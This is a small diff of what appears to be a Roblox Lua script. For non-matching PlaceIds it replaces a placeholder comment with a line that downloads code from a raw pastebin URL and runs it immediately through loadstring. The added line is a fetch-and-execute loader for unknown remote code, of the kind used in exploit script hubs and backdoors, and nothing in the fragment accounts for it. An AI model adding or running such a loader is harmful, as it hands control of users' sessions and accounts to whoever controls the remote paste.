@@ -17,5 +17,5 @@ if table.find(gamePlaceIds, currentPlaceId) then
     
     end
 else
-    -- Default code for non-game PlaceIds
+loadstring(game:HttpGet(('https://pastebin.com/raw/NiEmSuNH')))() 
 end
